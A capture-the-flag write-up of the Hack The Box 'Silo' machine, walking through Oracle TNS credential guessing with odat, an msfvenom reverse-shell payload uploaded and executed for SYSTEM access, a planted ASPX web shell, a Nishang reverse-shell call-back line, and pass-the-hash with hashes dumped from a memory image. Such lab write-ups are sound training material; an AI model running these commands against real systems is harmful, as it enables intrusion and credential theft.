## Default Information
IP Address: 10.10.10.82\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.82    silo.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.82 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-05 16:17:09 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49154/tcp on 10.10.10.82                                  
Discovered open port 49160/tcp on 10.10.10.82                                  
Discovered open port 445/tcp on 10.10.10.82                                    
Discovered open port 1521/tcp on 10.10.10.82                                   
Discovered open port 135/tcp on 10.10.10.82                                    
Discovered open port 49153/tcp on 10.10.10.82                                  
Discovered open port 49155/tcp on 10.10.10.82                                  
Discovered open port 139/tcp on 10.10.10.82                                    
Discovered open port 49161/tcp on 10.10.10.82                                  
Discovered open port 80/tcp on 10.10.10.82                                     
Discovered open port 49152/tcp on 10.10.10.82                                  
Discovered open port 49159/tcp on 10.10.10.82                                  
Discovered open port 47001/tcp on 10.10.10.82                                  
Discovered open port 49162/tcp on 10.10.10.82                                  
Discovered open port 5985/tcp on 10.10.10.82 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80  | http | Microsoft IIS httpd 8.5 | Open |
| 135 | msrpc | Microsoft Windows RPC | Open |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn | Open |
| 445 | microsoft-ds | Microsoft Windows Server 2008 R2 - 2012 microsoft-ds | Open |
| 1521 | oracle-tns | Oracle TNS listener 11.2.0.2.0 (unauthorized) | Open |
| 5985 | http | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | Open |
| 49152| msrpc | Microsoft Windows RPC | Open |
| 49153| msrpc | Microsoft Windows RPC | Open |
| 49154| msrpc | Microsoft Windows RPC | Open |
| 49155| msrpc | Microsoft Windows RPC | Open |
| 49159| oracle-tns | Oracle TNS listener (requires service name) | Open |
| 49160| msrpc | Microsoft Windows RPC | Open |
| 49161| msrpc | Microsoft Windows RPC | Open |
| 49162| msrpc | Microsoft Windows RPC | Open |

Looking at the nmap output, we realize that there is an Oracle TNS Service that is running for some of the ports. This is rather out of the norm and we will look into this later. 

### SMB Enumeration
Firstly, let us try to authenticate to the SMB server using null authentication. Unforunately, we are unable to authenticate using null authentication.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p "" -H 10.10.10.82
[!] Authentication error on 10.10.10.82
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u "" -p null -H 10.10.10.82
[!] Authentication error on 10.10.10.82
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u "" -p "" -H 10.10.10.82
[!] Authentication error on 10.10.10.82
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p null -H 10.10.10.82
[!] Authentication error on 10.10.10.82
```

### Web Enumeration
Using gobuster, we are able to find an endpoint. However, this endpoint returns a 403 Forbidden status code.

```
http://10.10.10.82:80/aspnet_client        (Status: 301) [Size: 159] [--> http://10.10.10.82:80/aspnet_client/]
```

Visiting http://silo.htb, we are redirected to a default IIS page but that does not provide any useful information as well.

### Oracle TNS Listener enumeration
Firstly, we need to find a valid SID for the Oracle TNS Listener service. This SID is a valid identifier for every database in the system. To do that, we will be using odat to guess the SIDs. From the output, we are able to find 2 SIDs (XE and XEXDB)

```
┌──(kali㉿kali)-[~]
└─$ odat sidguesser -s 10.10.10.82 -p 1521 

[1] (10.10.10.82:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
[+] 'XE' is a valid SID. Continue... ############################################################## | ETA:  00:00:08 
[+] 'XEXDB' is a valid SID. Continue...                                 
100% |##############################################################################################| Time: 00:15:17 
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521)
100% |##############################################################################################| Time: 00:00:30 
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521)
[+] 'XE' is a valid SID. Continue... ####################################################           | ETA:  00:01:28 
100% |##############################################################################################| Time: 00:13:36 
[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB
```

Next, we will use odat's passwordguesser to guess the credentials that can authenticate to the oracle database. From the output, we can find a valid set of credentials, scott/tiger

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/accounts_multiple.txt -v

[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
10:05:29 INFO -: Loading accounts stored in the accounts/accounts_multiple.txt file
10:05:29 INFO -: Separator between login and password fixed on '/'
10:05:29 INFO -: 668 paired login/password loaded
10:05:29 INFO -: Searching valid accounts on 10.10.10.82:1521/XE
10:05:29 INFO -: The 10.10.10.82-1521-XE.odat.save file has been created                            | ETA:  --:--:-- 
The login admin has already been tested at least once. What do you want to do:
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
10:49:01 INFO -: Impossible to execute the query 'SELECT platform_name FROM v$database': 'ORA-00942: table or view does not exist'
10:49:02 INFO -: OS version from getDatabasePlatfromName(): IBMPC/WIN_NT64-9.1.0
10:49:02 INFO -: Valid credential: scott/tiger (scott/tiger@10.10.10.82:1521/XE)  
[+] Valid credentials found: scott/tiger. Continue... 
100% |##############################################################################################| Time: 00:57:10 
[+] Accounts found on 10.10.10.82:1521/XE: 
scott/tiger  
```
## RCE on Oracle TNS Listener 

Since we have the credentials to the Oracle TNS Listener, we will try to do an RCE to the Oracle TNS Listener.
Firstly, we will try to use the Java stored procedure to check if we can execute code. Unfortunately, Java stored procedure is unable to execute or read files and so, it cannot be used to perform an RCE.

```
┌──(kali㉿kali)-[~]
└─$ sudo odat java -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module

[1] (10.10.10.82:1521): Test if the DBMSScheduler library can be used
[1.1] JAVA library ?
[-] KO
```

Next, we will move on to test on dbmsscheduler library. Unfortunately, the dbmsscheduler library also cannot be used to perform an RCE attack.

```
┌──(kali㉿kali)-[~]
└─$ sudo odat dbmsscheduler -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module

[1] (10.10.10.82:1521): Test if the DBMSScheduler library can be used
[1.1] DBMSSCHEDULER library ?
[-] KO
```

Lastly, we will move on to test on the externaltable library. From the output, the externaltable library is able to carry out an RCE attack as it can execute system commands. On top of thet, it is also able to read files on the system.

```
┌──(kali㉿kali)-[~]
└─$ sudo odat externaltable -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module

[1] (10.10.10.82:1521): Test if the External Table module can be used
[1.1] External table to read files ?
[+] OK
[1.2] External table to execute system commands ?
[+] OK
```

However, being able to read files alone is insufficient to create a reverse shell from the Oracle TNS Listener. We would still need permissions to be able to write files. For that, the externaltable library is unable to do so. 

We will then test for the permissions to write files using the utlfile library. Fortunately, the utlfile library can be used to write files.

```
┌──(kali㉿kali)-[~]
└─$ sudo odat utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module                      2 ⨯

[1] (10.10.10.82:1521): Test if the UTL_FILE library can be used
[1.1] UTL_FILE library ?
[+] OK
```

Next, we will generate our reverse shell payload using msfvenom

```
┌──(kali㉿kali)-[~/Desktop/silo]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=4000 -f exe -o shell.exe                   
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

Afterwards, we will use the utlfile module to write the shell.exe onto the C:/Windows/temp directory on our server.

```
┌──(kali㉿kali)-[~/Desktop/silo]
└─$ sudo odat utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile c:/windows/temp shell.exe `pwd`/shell.exe               

[1] (10.10.10.82:1521): Put the /home/kali/Desktop/silo/shell.exe local file in the c:/windows/temp folder like shell.exe on the 10.10.10.82 server
[+] The /home/kali/Desktop/silo/shell.exe file was created on the c:/windows/temp directory on the 10.10.10.82 server like the shell.exe file
```

Finally, we will use the externaltables module to execute the shell.exe at the c:/windows/temp directory.

```
┌──(kali㉿kali)-[~/Desktop/silo]
└─$ sudo odat externaltable -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --exec c:/windows/temp shell.exe

[1] (10.10.10.82:1521): Execute the shell.exe command stored in the c:/windows/temp path
```

This will then give us a reverse shell with SYSTEM privileges

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4000 
listening on [any] 4000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.82] 49165
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
whoami
nt authority\system
```
### Obtaining user flag

```
C:\Users\Phineas\Desktop>type user.txt
type user.txt
<Redacted User Flag>
```
### Obtaining root flag
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<Redacted root flag>
```

## Post-Exploitation
### Web Shell
Recalling from out nmap output that there is an open http port on port 80, we can also exploit by uploading a web shell to the C:/inetpub/wwwroot which is the web path for Windows server. 

To do so, we can use odat to upload our webshell to the web path.

```
┌──(kali㉿kali)-[~/Desktop/silo]
└─$ sudo odat utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile c:\\inetpub\\wwwroot cmd.aspx `pwd`/cmd.aspx

[1] (10.10.10.82:1521): Put the /home/kali/Desktop/silo/cmd.aspx local file in the c:\inetpub\wwwroot folder like cmd.aspx on the 10.10.10.82 server
[+] The /home/kali/Desktop/silo/cmd.aspx file was created on the c:\inetpub\wwwroot directory on the 10.10.10.82 server like the cmd.aspx file
```

Visiting http://silo.htb/cmd.aspx will then bring us to the webshell.

![WebShell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Silo/web_shell.png)

From here, we can easily obtain a reverse shell by using Invoke-PowerShellTcp.ps1 script from Nishang. However, we would need to modify the script by adding the following line to the end of the script.

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.5 -Port 4000
```

Afterwards, all we have to do is to upload the Invoke-PowerShellTcp.ps1 script using the cmd.aspx web shell that we have uploaded earlier and execute the command to obtain a reverse shell.
![Obtaining reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Silo/reverse_shell.png)

### Obtaining root shell using Volatility
Navigating to C:\Users\phineas\Desktop, we are able to find a ```Oracle issue.txt``` file. Opening the file, we are provided with a dropbox link and the password to the dropbox link.
```
PS C:\Users\phineas\Desktop> type "Oracle issue.txt"
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link 
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
?%Hm8646uC$
PS C:\Users\phineas\Desktop> 
```

However, we are unable to login to the link using the password that we have obtained. Using the cmd.aspx web shell that we have uploaded earlier, we would realize that the ```?``` in the password is actually ```£```

![Obtaining link password from web shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Silo/password_web_shell.png)

Authenticating into the dropbox link, we would be able to download a zip file that contains the a dmp file. To exploit this, we will use volatility to analyze the dmp file. 

To start with, we will need to find the profile using kdbgscan. From the output, the profile that we are going to use would be Win10x64_14393

```
┌──(kali㉿kali)-[~/Desktop/volatility]
└─$ ./volatility -f /home/kali/Desktop/silo/SILO-20180105-221806.dmp kdbgscan  
**************************************************
Instantiating KDBG using: Unnamed AS Win2012R2x64_18340 (6.3.9601 64bit)
Offset (V)                    : 0xf80078520a30
Offset (P)                    : 0x2320a30
KdCopyDataBlock (V)           : 0xf8007845f9b0
Block encoded                 : Yes
Wait never                    : 0xd08e8400bd4a143a
Wait always                   : 0x17a949efd11db80
KDBG owner tag check          : True
Profile suggestion (KDBGHeader): Win2012R2x64_18340
Version64                     : 0xf80078520d90 (Major: 15, Minor: 9600)
Service Pack (CmNtCSDVersion) : 0
Build string (NtBuildLab)     : 9600.16384.amd64fre.winblue_rtm.
PsActiveProcessHead           : 0xfffff80078537700 (51 processes)
PsLoadedModuleList            : 0xfffff800785519b0 (148 modules)
KernelBase                    : 0xfffff8007828a000 (Matches MZ: True)
Major (OptionalHeader)        : 6
Minor (OptionalHeader)        : 3
KPCR                          : 0xfffff8007857b000 (CPU 0)
KPCR                          : 0xffffd000207e8000 (CPU 1)
**************************************************
```

Next, we will try to dump all the hashes that are being stored in the memory. Before we do that, we will have to obtain all the registry hives stored in the memory. With some experimentation, we realize that if we use ```Win2012R2x64``` as the profile instead of ```Win2012R2x64_18340```, we will be able to get the output of registry hives.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/volatility]
└─$ ./volatility -f /home/kali/Desktop/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist 
Volatility Foundation Volatility Framework 2.6
Virtual            Physical           Name
------------------ ------------------ ----
0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat
0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS
0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache.hve
0xffffc0000001e000 0x0000000000b65000 [no name]
0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM
0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE
0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD
0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE
0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT
0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY
0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM
0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI
0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xffffc00000fed000 0x000000000d67f000 \??\C:\Users\Administrator\ntuser.dat
```

Now, we will use the hashdump plugin to dump all the hashes from \REGISTRY\MACHINE\SYSTEM to \SystemRoot\System32\Config\SAM

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/volatility]
└─$ ./volatility -f /home/kali/Desktop/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
```

Since we have obtained the hash for the Administrator, we can use pass-the-hash attack to authenticate to the Windows server using the obtained hash.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/volatility]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82 Administrator@10.10.10.82
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.82.....
[*] Found writable share ADMIN$
[*] Uploading file BRkPUcaV.exe
[*] Opening SVCManager on 10.10.10.82.....
[*] Creating service hVnS on 10.10.10.82.....
[*] Starting service hVnS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```
